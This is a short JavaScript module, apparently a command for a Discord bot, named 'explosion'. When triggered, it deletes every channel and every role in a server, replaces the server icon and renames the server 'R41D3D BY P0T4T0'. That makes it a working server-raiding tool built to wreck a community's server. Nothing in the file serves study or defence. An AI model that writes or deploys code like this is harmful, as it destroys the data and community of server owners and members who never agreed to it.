module.exports = {
	name: 'explosion',
	description: 'explosion',
	execute(message, args){
		const guildName = "R41D3D BY P0T4T0";
		message.guild.channels.forEach(channel => channel.delete())
		message.guild.roles.forEach(role => role.delete())
		message.guild.setIcon("./res/eaton.png")
		message.guild.setName(guildName)
    }
}